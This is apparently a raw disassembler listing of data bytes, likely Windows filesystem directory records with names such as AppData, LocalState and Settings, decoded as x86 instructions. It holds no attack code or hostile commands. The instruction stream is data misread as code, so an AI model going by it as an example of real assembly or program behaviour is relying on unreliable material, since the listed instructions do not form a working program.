  402332:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  402337:	00 47 00             	add    %al,0x0(%edi)
  40233a:	00 00                	add    %al,(%eax)
  40233c:	00 00                	add    %al,(%eax)
  40233e:	00 00                	add    %al,(%eax)
  402340:	6f                   	outsl  %ds:(%esi),(%dx)
  402341:	da 00                	fiaddl (%eax)
  402343:	00 00                	add    %al,(%eax)
  402345:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  402349:	00 5a 00             	add    %bl,0x0(%edx)
  40234c:	00 00                	add    %al,(%eax)
  40234e:	00 00                	add    %al,(%eax)
  402350:	73 8b                	jae    0x4022dd
  402352:	01 00                	add    %eax,(%eax)
  402354:	00 00                	add    %al,(%eax)
  402356:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  40235d:	2f                   	das
  40235e:	da 01                	fiaddl (%ecx)
  402360:	2b 8b 2a c0 89 43    	sub    0x4389c02a(%ebx),%ecx
  402366:	da 01                	fiaddl (%ecx)
  402368:	51                   	push   %ecx
  402369:	34 6b                	xor    $0x6b,%al
  40236b:	64 15 61 da 01 2b    	fs adc $0x2b01da61,%eax
  402371:	8b 2a                	mov    (%edx),%ebp
  402373:	c0 89 43 da 01 00 30 	rorb   $0x30,0x1da43(%ecx)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	00 00                	add    %al,(%eax)
  40237e:	00 00                	add    %al,(%eax)
  402380:	76 2c                	jbe    0x4023ae
  402382:	00 00                	add    %al,(%eax)
  402384:	00 00                	add    %al,(%eax)
  402386:	00 00                	add    %al,(%eax)
  402388:	20 00                	and    %al,(%eax)
  40238a:	00 00                	add    %al,(%eax)
  40238c:	00 00                	add    %al,(%eax)
  40238e:	00 00                	add    %al,(%eax)
  402390:	0c 02                	or     $0x2,%al
  402392:	4c                   	dec    %esp
  402393:	00 41 00             	add    %al,0x0(%ecx)
  402396:	55                   	push   %ebp
  402397:	00 4e 00             	add    %cl,0x0(%esi)
  40239a:	43                   	inc    %ebx
  40239b:	00 48 00             	add    %cl,0x0(%eax)
  40239e:	7e 00                	jle    0x4023a0
  4023a0:	32 00                	xor    (%eax),%al
  4023a2:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  4023a7:	00 47 00             	add    %al,0x0(%edi)
  4023aa:	00 00                	add    %al,(%eax)
  4023ac:	00 00                	add    %al,(%eax)
  4023ae:	00 00                	add    %al,(%eax)
  4023b0:	0d dd 00 00 00       	or     $0xdd,%eax
  4023b5:	00 62 00             	add    %ah,0x0(%edx)
  4023b8:	70 00                	jo     0x4023ba
  4023ba:	5a                   	pop    %edx
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	00 00                	add    %al,(%eax)
  4023bf:	00 73 8b             	add    %dh,-0x75(%ebx)
  4023c2:	01 00                	add    %eax,(%eax)
  4023c4:	00 00                	add    %al,(%eax)
  4023c6:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  4023cd:	2f                   	das
  4023ce:	da 01                	fiaddl (%ecx)
  4023d0:	a2 15 c2 7c 90       	mov    %al,0x907cc215
  4023d5:	43                   	inc    %ebx
  4023d6:	da 01                	fiaddl (%ecx)
  4023d8:	5d                   	pop    %ebp
  4023d9:	5b                   	pop    %ebx
  4023da:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  4023df:	01 a2 15 c2 7c 90    	add    %esp,-0x6f833deb(%edx)
  4023e5:	43                   	inc    %ebx
  4023e6:	da 01                	fiaddl (%ecx)
  4023e8:	00 30                	add    %dh,(%eax)
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	00 00                	add    %al,(%eax)
  4023ee:	00 00                	add    %al,(%eax)
  4023f0:	48                   	dec    %eax
  4023f1:	2d 00 00 00 00       	sub    $0x0,%eax
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	20 00                	and    %al,(%eax)
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	b8 00 0c 02 4c       	mov    $0x4c020c00,%eax
  402403:	00 41 00             	add    %al,0x0(%ecx)
  402406:	55                   	push   %ebp
  402407:	00 4e 00             	add    %cl,0x0(%esi)
  40240a:	43                   	inc    %ebx
  40240b:	00 48 00             	add    %cl,0x0(%eax)
  40240e:	7e 00                	jle    0x402410
  402410:	33 00                	xor    (%eax),%eax
  402412:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  402417:	00 47 00             	add    %al,0x0(%edi)
  40241a:	00 00                	add    %al,(%eax)
  40241c:	00 00                	add    %al,(%eax)
  40241e:	00 00                	add    %al,(%eax)
  402420:	8c ca                	mov    %cs,%edx
  402422:	00 00                	add    %al,(%eax)
  402424:	00 00                	add    %al,(%eax)
  402426:	95                   	xchg   %eax,%ebp
  402427:	00 70 00             	add    %dh,0x0(%eax)
  40242a:	5a                   	pop    %edx
  40242b:	00 00                	add    %al,(%eax)
  40242d:	00 00                	add    %al,(%eax)
  40242f:	00 73 8b             	add    %dh,-0x75(%ebx)
  402432:	01 00                	add    %eax,(%eax)
  402434:	00 00                	add    %al,(%eax)
  402436:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  40243d:	2f                   	das
  40243e:	da 01                	fiaddl (%ecx)
  402440:	53                   	push   %ebx
  402441:	cd e5                	int    $0xe5
  402443:	fb                   	sti
  402444:	68 5c da 01 5d       	push   $0x5d01da5c
  402449:	5b                   	pop    %ebx
  40244a:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  40244f:	01 53 cd             	add    %edx,-0x33(%ebx)
  402452:	e5 fb                	in     $0xfb,%eax
  402454:	68 5c da 01 00       	push   $0x1da5c
  402459:	20 00                	and    %al,(%eax)
  40245b:	00 00                	add    %al,(%eax)
  40245d:	00 00                	add    %al,(%eax)
  40245f:	00 da                	add    %bl,%dl
  402461:	1d 00 00 00 00       	sbb    $0x0,%eax
  402466:	00 00                	add    %al,(%eax)
  402468:	20 00                	and    %al,(%eax)
  40246a:	00 00                	add    %al,(%eax)
  40246c:	00 00                	add    %al,(%eax)
  40246e:	00 00                	add    %al,(%eax)
  402470:	0c 02                	or     $0x2,%al
  402472:	4c                   	dec    %esp
  402473:	00 41 00             	add    %al,0x0(%ecx)
  402476:	55                   	push   %ebp
  402477:	00 4e 00             	add    %cl,0x0(%esi)
  40247a:	43                   	inc    %ebx
  40247b:	00 48 00             	add    %cl,0x0(%eax)
  40247e:	7e 00                	jle    0x402480
  402480:	34 00                	xor    $0x0,%al
  402482:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  402487:	00 47 00             	add    %al,0x0(%edi)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	00 00                	add    %al,(%eax)
  40248e:	00 00                	add    %al,(%eax)
  402490:	6e                   	outsb  %ds:(%esi),(%dx)
  402491:	8c 01                	mov    %es,(%ecx)
  402493:	00 00                	add    %al,(%eax)
  402495:	00 21                	add    %ah,(%ecx)
  402497:	00 68 00             	add    %ch,0x0(%eax)
  40249a:	52                   	push   %edx
  40249b:	00 00                	add    %al,(%eax)
  40249d:	00 00                	add    %al,(%eax)
  40249f:	00 73 8b             	add    %dh,-0x75(%ebx)
  4024a2:	01 00                	add    %eax,(%eax)
  4024a4:	00 00                	add    %al,(%eax)
  4024a6:	0f 00 d0             	lldt   %eax
  4024a9:	c9                   	leave
  4024aa:	f2 a9 d0 2f da 01    	repnz test $0x1da2fd0,%eax
  4024b0:	d0 c9                	ror    $1,%cl
  4024b2:	f2 a9 d0 2f da 01    	repnz test $0x1da2fd0,%eax
  4024b8:	d0 c9                	ror    $1,%cl
  4024ba:	f2 a9 d0 2f da 01    	repnz test $0x1da2fd0,%eax
  4024c0:	2c 63                	sub    $0x63,%al
  4024c2:	25 69 ba 4e db       	and    $0xdb4eba69,%eax
  4024c7:	01 00                	add    %eax,(%eax)
	...
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	10 00                	adc    %al,(%eax)
  4024dd:	00 00                	add    %al,(%eax)
  4024df:	00 08                	add    %cl,(%eax)
  4024e1:	03 50 00             	add    0x0(%eax),%edx
  4024e4:	72 00                	jb     0x4024e6
  4024e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e7:	00 66 00             	add    %ah,0x0(%esi)
  4024ea:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4024f0:	73 00                	jae    0x4024f2
	...
  4024fe:	00 00                	add    %al,(%eax)
  402500:	10 00                	adc    %al,(%eax)
  402502:	00 00                	add    %al,(%eax)
  402504:	02 00                	add    (%eax),%al
	...
  4025fe:	b8 00 00 00 00       	mov    $0x0,%eax
	...
  4027fb:	00 00                	add    %al,(%eax)
  4027fd:	00 b8 00 00 00 00    	add    %bh,0x0(%eax)
	...
  4029fb:	00 00                	add    %al,(%eax)
  4029fd:	00 b8 00 00 00 00    	add    %bh,0x0(%eax)
	...
  402bfb:	00 00                	add    %al,(%eax)
  402bfd:	00 b8 00 49 4e 44    	add    %bh,0x444e4900(%eax)
  402c03:	58                   	pop    %eax
  402c04:	28 00                	sub    %al,(%eax)
  402c06:	09 00                	or     %eax,(%eax)
  402c08:	70 a4                	jo     0x402bae
  402c0a:	31 a4 17 00 00 00 00 	xor    %esp,0x0(%edi,%edx,1)
  402c11:	00 00                	add    %al,(%eax)
  402c13:	00 00                	add    %al,(%eax)
  402c15:	00 00                	add    %al,(%eax)
  402c17:	00 28                	add    %ch,(%eax)
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	00 78 05             	add    %bh,0x5(%eax)
  402c1e:	00 00                	add    %al,(%eax)
  402c20:	e8 0f 00 00 00       	call   0x402c34
  402c25:	00 00                	add    %al,(%eax)
  402c27:	00 d8                	add    %bl,%al
  402c29:	00 db                	add    %bl,%bl
  402c2b:	01 db                	add    %ebx,%ebx
  402c2d:	01 00                	add    %eax,(%eax)
	...
  402c3f:	00 1c 2a             	add    %bl,(%edx,%ebp,1)
  402c42:	00 00                	add    %al,(%eax)
  402c44:	00 00                	add    %al,(%eax)
  402c46:	51                   	push   %ecx
  402c47:	00 58 00             	add    %bl,0x0(%eax)
  402c4a:	46                   	inc    %esi
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	00 00                	add    %al,(%eax)
  402c4f:	00 09                	add    %cl,(%ecx)
  402c51:	2a 00                	sub    (%eax),%al
  402c53:	00 00                	add    %al,(%eax)
  402c55:	00 61 00             	add    %ah,0x0(%ecx)
  402c58:	33 64 68 b7          	xor    -0x49(%eax,%ebp,2),%esp
  402c5c:	d2 23                	shlb   %cl,(%ebx)
  402c5e:	da 01                	fiaddl (%ecx)
  402c60:	5c                   	pop    %esp
  402c61:	1b 6f b7             	sbb    -0x49(%edi),%ebp
  402c64:	d2 23                	shlb   %cl,(%ebx)
  402c66:	da 01                	fiaddl (%ecx)
  402c68:	5c                   	pop    %esp
  402c69:	1b 6f b7             	sbb    -0x49(%edi),%ebp
  402c6c:	d2 23                	shlb   %cl,(%ebx)
  402c6e:	da 01                	fiaddl (%ecx)
  402c70:	23 d5                	and    %ebp,%edx
  402c72:	7b 63                	jnp    0x402cd7
  402c74:	be 4e db 01 00       	mov    $0x1db4e,%esi
	...
  402c89:	20 00                	and    %al,(%eax)
  402c8b:	10 00                	adc    %al,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	00 02                	add    %al,(%edx)
  402c91:	03 41 00             	add    0x0(%ecx),%eax
  402c94:	43                   	inc    %ebx
  402c95:	00 70 00             	add    %dh,0x0(%eax)
  402c98:	60                   	pusha
  402c99:	2a 00                	sub    (%eax),%al
  402c9b:	00 00                	add    %al,(%eax)
  402c9d:	00 50 00             	add    %dl,0x0(%eax)
  402ca0:	60                   	pusha
  402ca1:	00 50 00             	add    %dl,0x0(%eax)
  402ca4:	00 00                	add    %al,(%eax)
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	09 2a                	or     %ebp,(%edx)
  402caa:	00 00                	add    %al,(%eax)
  402cac:	00 00                	add    %al,(%eax)
  402cae:	61                   	popa
  402caf:	00 01                	add    %al,(%ecx)
  402cb1:	86 61 b7             	xchg   %ah,-0x49(%ecx)
  402cb4:	d2 23                	shlb   %cl,(%ebx)
  402cb6:	da 01                	fiaddl (%ecx)
  402cb8:	01 86 61 b7 d2 23    	add    %eax,0x23d2b761(%esi)
  402cbe:	da 01                	fiaddl (%ecx)
  402cc0:	01 86 61 b7 d2 23    	add    %eax,0x23d2b761(%esi)
  402cc6:	da 01                	fiaddl (%ecx)
  402cc8:	d0 e3                	shl    $1,%bl
  402cca:	1e                   	push   %ds
  402ccb:	f9                   	stc
  402ccc:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  402ccf:	01 00                	add    %eax,(%eax)
	...
  402ce1:	00 00                	add    %al,(%eax)
  402ce3:	10 00                	adc    %al,(%eax)
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	00 07                	add    %al,(%edi)
  402ce9:	03 41 00             	add    0x0(%ecx),%eax
  402cec:	70 00                	jo     0x402cee
  402cee:	70 00                	jo     0x402cf0
  402cf0:	44                   	inc    %esp
  402cf1:	00 61 00             	add    %ah,0x0(%ecx)
  402cf4:	74 00                	je     0x402cf6
  402cf6:	61                   	popa
  402cf7:	00 16                	add    %dl,(%esi)
  402cf9:	2a 00                	sub    (%eax),%al
  402cfb:	00 00                	add    %al,(%eax)
  402cfd:	00 9e 00 68 00 56    	add    %bl,0x56006800(%esi)
  402d03:	00 00                	add    %al,(%eax)
  402d05:	00 00                	add    %al,(%eax)
  402d07:	00 09                	add    %cl,(%ecx)
  402d09:	2a 00                	sub    (%eax),%al
  402d0b:	00 00                	add    %al,(%eax)
  402d0d:	00 61 00             	add    %ah,0x0(%ecx)
  402d10:	d7                   	xlat   %ds:(%ebx)
  402d11:	37                   	aaa
  402d12:	61                   	popa
  402d13:	b7 d2                	mov    $0xd2,%bh
  402d15:	23 da                	and    %edx,%ebx
  402d17:	01 d7                	add    %edx,%edi
  402d19:	37                   	aaa
  402d1a:	61                   	popa
  402d1b:	b7 d2                	mov    $0xd2,%bh
  402d1d:	23 da                	and    %edx,%ebx
  402d1f:	01 d7                	add    %edx,%edi
  402d21:	37                   	aaa
  402d22:	61                   	popa
  402d23:	b7 d2                	mov    $0xd2,%bh
  402d25:	23 da                	and    %edx,%ebx
  402d27:	01 d0                	add    %edx,%eax
  402d29:	e3 1e                	jecxz  0x402d49
  402d2b:	f9                   	stc
  402d2c:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  402d2f:	01 00                	add    %eax,(%eax)
	...
  402d41:	00 00                	add    %al,(%eax)
  402d43:	10 00                	adc    %al,(%eax)
  402d45:	00 00                	add    %al,(%eax)
  402d47:	00 0a                	add    %cl,(%edx)
  402d49:	01 4c 00 6f          	add    %ecx,0x6f(%eax,%eax,1)
  402d4d:	00 63 00             	add    %ah,0x0(%ebx)
  402d50:	61                   	popa
  402d51:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  402d55:	00 61 00             	add    %ah,0x0(%ecx)
  402d58:	63 00                	arpl   %eax,(%eax)
  402d5a:	68 00 65 00 00       	push   $0x6500
  402d5f:	00 16                	add    %dl,(%esi)
  402d61:	2a 00                	sub    (%eax),%al
  402d63:	00 00                	add    %al,(%eax)
  402d65:	00 9e 00 68 00 52    	add    %bl,0x52006800(%esi)
  402d6b:	00 00                	add    %al,(%eax)
  402d6d:	00 00                	add    %al,(%eax)
  402d6f:	00 09                	add    %cl,(%ecx)
  402d71:	2a 00                	sub    (%eax),%al
  402d73:	00 00                	add    %al,(%eax)
  402d75:	00 61 00             	add    %ah,0x0(%ecx)
  402d78:	d7                   	xlat   %ds:(%ebx)
  402d79:	37                   	aaa
  402d7a:	61                   	popa
  402d7b:	b7 d2                	mov    $0xd2,%bh
  402d7d:	23 da                	and    %edx,%ebx
  402d7f:	01 d7                	add    %edx,%edi
  402d81:	37                   	aaa
  402d82:	61                   	popa
  402d83:	b7 d2                	mov    $0xd2,%bh
  402d85:	23 da                	and    %edx,%ebx
  402d87:	01 d7                	add    %edx,%edi
  402d89:	37                   	aaa
  402d8a:	61                   	popa
  402d8b:	b7 d2                	mov    $0xd2,%bh
  402d8d:	23 da                	and    %edx,%ebx
  402d8f:	01 d0                	add    %edx,%eax
  402d91:	e3 1e                	jecxz  0x402db1
  402d93:	f9                   	stc
  402d94:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  402d97:	01 00                	add    %eax,(%eax)
	...
  402da9:	00 00                	add    %al,(%eax)
  402dab:	10 00                	adc    %al,(%eax)
  402dad:	00 00                	add    %al,(%eax)
  402daf:	00 08                	add    %cl,(%eax)
  402db1:	02 4c 00 4f          	add    0x4f(%eax,%eax,1),%cl
  402db5:	00 43 00             	add    %al,0x0(%ebx)
  402db8:	41                   	inc    %ecx
  402db9:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  402dbd:	00 7e 00             	add    %bh,0x0(%esi)
  402dc0:	31 00                	xor    %eax,(%eax)
  402dc2:	74 00                	je     0x402dc4
  402dc4:	65 00 00             	add    %al,%gs:(%eax)
  402dc7:	00 11                	add    %dl,(%ecx)
  402dc9:	2a 00                	sub    (%eax),%al
  402dcb:	00 00                	add    %al,(%eax)
  402dcd:	00 b0 00 68 00 56    	add    %dh,0x56006800(%eax)
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	00 00                	add    %al,(%eax)
  402dd7:	00 09                	add    %cl,(%ecx)
  402dd9:	2a 00                	sub    (%eax),%al
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	00 61 00             	add    %ah,0x0(%ecx)
  402de0:	b3 e9                	mov    $0xe9,%bl
  402de2:	60                   	pusha
  402de3:	b7 d2                	mov    $0xd2,%bh
  402de5:	23 da                	and    %edx,%ebx
  402de7:	01 b3 e9 60 b7 d2    	add    %esi,-0x2d489f17(%ebx)
  402ded:	23 da                	and    %edx,%ebx
  402def:	01 b3 e9 60 b7 d2    	add    %esi,-0x2d489f17(%ebx)
  402df5:	23 da                	and    %edx,%ebx
  402df7:	01 d0                	add    %edx,%eax
  402df9:	e3 1e                	jecxz  0x402e19
  402dfb:	f9                   	stc
  402dfc:	d3 3c d8             	sarl   %cl,(%eax,%ebx,8)
	...
  402e13:	10 00                	adc    %al,(%eax)
  402e15:	00 00                	add    %al,(%eax)
  402e17:	00 0a                	add    %cl,(%edx)
  402e19:	01 4c 00 6f          	add    %ecx,0x6f(%eax,%eax,1)
  402e1d:	00 63 00             	add    %ah,0x0(%ebx)
  402e20:	61                   	popa
  402e21:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  402e25:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  402e29:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  402e2d:	00 00                	add    %al,(%eax)
  402e2f:	00 11                	add    %dl,(%ecx)
  402e31:	2a 00                	sub    (%eax),%al
  402e33:	00 00                	add    %al,(%eax)
  402e35:	00 b0 00 68 00 52    	add    %dh,0x52006800(%eax)
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	00 09                	add    %cl,(%ecx)
  402e41:	2a 00                	sub    (%eax),%al
  402e43:	00 00                	add    %al,(%eax)
  402e45:	00 61 00             	add    %ah,0x0(%ecx)
  402e48:	b3 e9                	mov    $0xe9,%bl
  402e4a:	60                   	pusha
  402e4b:	b7 d2                	mov    $0xd2,%bh
  402e4d:	23 da                	and    %edx,%ebx
  402e4f:	01 b3 e9 60 b7 d2    	add    %esi,-0x2d489f17(%ebx)
  402e55:	23 da                	and    %edx,%ebx
  402e57:	01 b3 e9 60 b7 d2    	add    %esi,-0x2d489f17(%ebx)
  402e5d:	23 da                	and    %edx,%ebx
  402e5f:	01 d0                	add    %edx,%eax
  402e61:	e3 1e                	jecxz  0x402e81
  402e63:	f9                   	stc
  402e64:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  402e67:	01 00                	add    %eax,(%eax)
	...
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	10 00                	adc    %al,(%eax)
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	00 08                	add    %cl,(%eax)
  402e81:	02 4c 00 4f          	add    0x4f(%eax,%eax,1),%cl
  402e85:	00 43 00             	add    %al,0x0(%ebx)
  402e88:	41                   	inc    %ecx
  402e89:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  402e8d:	00 7e 00             	add    %bh,0x0(%esi)
  402e90:	31 00                	xor    %eax,(%eax)
  402e92:	00 00                	add    %al,(%eax)
  402e94:	00 00                	add    %al,(%eax)
  402e96:	00 00                	add    %al,(%eax)
  402e98:	13 2a                	adc    (%edx),%ebp
  402e9a:	00 00                	add    %al,(%eax)
  402e9c:	00 00                	add    %al,(%eax)
  402e9e:	75 00                	jne    0x402ea0
  402ea0:	70 00                	jo     0x402ea2
  402ea2:	5a                   	pop    %edx
  402ea3:	00 00                	add    %al,(%eax)
  402ea5:	00 00                	add    %al,(%eax)
  402ea7:	00 09                	add    %cl,(%ecx)
  402ea9:	2a 00                	sub    (%eax),%al
  402eab:	00 00                	add    %al,(%eax)
  402ead:	00 61 00             	add    %ah,0x0(%ecx)
  402eb0:	b3 e9                	mov    $0xe9,%bl
  402eb2:	60                   	pusha
  402eb3:	b7 d2                	mov    $0xd2,%bh
  402eb5:	23 da                	and    %edx,%ebx
  402eb7:	01 b3 e9 60 b7 d2    	add    %esi,-0x2d489f17(%ebx)
  402ebd:	23 da                	and    %edx,%ebx
  402ebf:	01 c2                	add    %eax,%edx
  402ec1:	10 61 b7             	adc    %ah,-0x49(%ecx)
  402ec4:	d2 23                	shlb   %cl,(%ebx)
  402ec6:	da 01                	fiaddl (%ecx)
  402ec8:	d0 e3                	shl    $1,%bl
  402eca:	1e                   	push   %ds
  402ecb:	f9                   	stc
  402ecc:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  402ecf:	01 00                	add    %eax,(%eax)
	...
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	10 00                	adc    %al,(%eax)
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  402eea:	52                   	push   %edx
  402eeb:	00 6f 00             	add    %ch,0x0(%edi)
  402eee:	61                   	popa
  402eef:	00 6d 00             	add    %ch,0x0(%ebp)
  402ef2:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  402ef8:	53                   	push   %ebx
  402ef9:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  402efd:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  402f01:	00 00                	add    %al,(%eax)
  402f03:	00 00                	add    %al,(%eax)
  402f05:	00 00                	add    %al,(%eax)
  402f07:	00 13                	add    %dl,(%ebx)
  402f09:	2a 00                	sub    (%eax),%al
  402f0b:	00 00                	add    %al,(%eax)
  402f0d:	00 75 00             	add    %dh,0x0(%ebp)
  402f10:	68 00 52 00 00       	push   $0x5200
  402f15:	00 00                	add    %al,(%eax)
  402f17:	00 09                	add    %cl,(%ecx)
  402f19:	2a 00                	sub    (%eax),%al
  402f1b:	00 00                	add    %al,(%eax)
  402f1d:	00 61 00             	add    %ah,0x0(%ecx)
  402f20:	b3 e9                	mov    $0xe9,%bl
  402f22:	60                   	pusha
  402f23:	b7 d2                	mov    $0xd2,%bh
  402f25:	23 da                	and    %edx,%ebx
  402f27:	01 b3 e9 60 b7 d2    	add    %esi,-0x2d489f17(%ebx)
  402f2d:	23 da                	and    %edx,%ebx
  402f2f:	01 c2                	add    %eax,%edx
  402f31:	10 61 b7             	adc    %ah,-0x49(%ecx)
  402f34:	d2 23                	shlb   %cl,(%ebx)
  402f36:	da 01                	fiaddl (%ecx)
  402f38:	d0 e3                	shl    $1,%bl
  402f3a:	1e                   	push   %ds
  402f3b:	f9                   	stc
  402f3c:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  402f3f:	01 00                	add    %eax,(%eax)
	...
  402f51:	00 00                	add    %al,(%eax)
  402f53:	10 00                	adc    %al,(%eax)
  402f55:	00 00                	add    %al,(%eax)
  402f57:	00 08                	add    %cl,(%eax)
  402f59:	02 52 00             	add    0x0(%edx),%dl
  402f5c:	4f                   	dec    %edi
  402f5d:	00 41 00             	add    %al,0x0(%ecx)
  402f60:	4d                   	dec    %ebp
  402f61:	00 49 00             	add    %cl,0x0(%ecx)
  402f64:	4e                   	dec    %esi
  402f65:	00 7e 00             	add    %bh,0x0(%esi)
  402f68:	31 00                	xor    %eax,(%eax)
  402f6a:	00 00                	add    %al,(%eax)
  402f6c:	00 00                	add    %al,(%eax)
  402f6e:	00 00                	add    %al,(%eax)
  402f70:	19 2a                	sbb    %ebp,(%edx)
  402f72:	00 00                	add    %al,(%eax)
  402f74:	00 00                	add    %al,(%eax)
  402f76:	a8 00                	test   $0x0,%al
  402f78:	68 00 52 00 00       	push   $0x5200
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 09                	add    %cl,(%ecx)
  402f81:	2a 00                	sub    (%eax),%al
  402f83:	00 00                	add    %al,(%eax)
  402f85:	00 61 00             	add    %ah,0x0(%ecx)
  402f88:	d7                   	xlat   %ds:(%ebx)
  402f89:	37                   	aaa
  402f8a:	61                   	popa
  402f8b:	b7 d2                	mov    $0xd2,%bh
  402f8d:	23 da                	and    %edx,%ebx
  402f8f:	01 48 cd             	add    %ecx,-0x33(%eax)
  402f92:	50                   	push   %eax
  402f93:	e3 d4                	jecxz  0x402f69
  402f95:	23 da                	and    %edx,%ebx
  402f97:	01 48 cd             	add    %ecx,-0x33(%eax)
  402f9a:	50                   	push   %eax
  402f9b:	e3 d4                	jecxz  0x402f71
  402f9d:	23 da                	and    %edx,%ebx
  402f9f:	01 e5                	add    %esp,%ebp
  402fa1:	0a 1f                	or     (%edi),%bl
  402fa3:	f9                   	stc
  402fa4:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  402fa7:	01 00                	add    %eax,(%eax)
	...
  402fb9:	00 00                	add    %al,(%eax)
  402fbb:	10 00                	adc    %al,(%eax)
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	00 08                	add    %cl,(%eax)
  402fc1:	03 53 00             	add    0x0(%ebx),%edx
  402fc4:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  402fc9:	00 69 00             	add    %ch,0x0(%ecx)
  402fcc:	6e                   	outsb  %ds:(%esi),(%dx)
  402fcd:	00 67 00             	add    %ah,0x0(%edi)
  402fd0:	73 00                	jae    0x402fd2
  402fd2:	65 00 00             	add    %al,%gs:(%eax)
  402fd5:	00 00                	add    %al,(%eax)
  402fd7:	00 1d 2a 00 00 00    	add    %bl,0x2a
  402fdd:	00 65 00             	add    %ah,0x0(%ebp)
  402fe0:	70 00                	jo     0x402fe2
  402fe2:	5c                   	pop    %esp
  402fe3:	00 00                	add    %al,(%eax)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	2a 00                	sub    (%eax),%al
  402feb:	00 00                	add    %al,(%eax)
  402fed:	00 61 00             	add    %ah,0x0(%ecx)
  402ff0:	ef                   	out    %eax,(%dx)
  402ff1:	5e                   	pop    %esi
  402ff2:	61                   	popa
  402ff3:	b7 d2                	mov    $0xd2,%bh
  402ff5:	23 da                	and    %edx,%ebx
  402ff7:	01 75 2e             	add    %esi,0x2e(%ebp)
  402ffa:	9d                   	popf
  402ffb:	b7 76                	mov    $0x76,%bh
  402ffd:	16                   	push   %ss
  402ffe:	d8 00                	fadds  (%eax)
  403000:	75 2e                	jne    0x403030
  403002:	9d                   	popf
  403003:	b7 76                	mov    $0x76,%bh
  403005:	16                   	push   %ss
  403006:	db 01                	fildl  (%ecx)
  403008:	f7 31                	divl   (%ecx)
  40300a:	1f                   	pop    %ds
  40300b:	f9                   	stc
  40300c:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  40300f:	01 00                	add    %eax,(%eax)
	...
  403021:	00 00                	add    %al,(%eax)
  403023:	10 00                	adc    %al,(%eax)
  403025:	00 00                	add    %al,(%eax)
  403027:	00 0d 01 53 00 79    	add    %cl,0x79005301
  40302d:	00 73 00             	add    %dh,0x0(%ebx)
  403030:	74 00                	je     0x403032
  403032:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  403036:	41                   	inc    %ecx
  403037:	00 70 00             	add    %dh,0x0(%eax)
  40303a:	70 00                	jo     0x40303c
  40303c:	44                   	inc    %esp
  40303d:	00 61 00             	add    %ah,0x0(%ecx)
  403040:	74 00                	je     0x403042
  403042:	61                   	popa
  403043:	00 00                	add    %al,(%eax)
  403045:	00 0f                	add    %cl,(%edi)
  403047:	01 1d 2a 00 00 00    	add    %ebx,0x2a
  40304d:	00 65 00             	add    %ah,0x0(%ebp)
  403050:	68 00 52 00 00       	push   $0x5200
  403055:	00 00                	add    %al,(%eax)
  403057:	00 09                	add    %cl,(%ecx)
  403059:	2a 00                	sub    (%eax),%al
  40305b:	00 00                	add    %al,(%eax)
  40305d:	00 61 00             	add    %ah,0x0(%ecx)
  403060:	ef                   	out    %eax,(%dx)
  403061:	5e                   	pop    %esi
  403062:	61                   	popa
  403063:	b7 d2                	mov    $0xd2,%bh
  403065:	23 da                	and    %edx,%ebx
  403067:	01 75 2e             	add    %esi,0x2e(%ebp)
  40306a:	9d                   	popf
  40306b:	b7 76                	mov    $0x76,%bh
  40306d:	16                   	push   %ss
  40306e:	db 01                	fildl  (%ecx)
  403070:	75 2e                	jne    0x4030a0
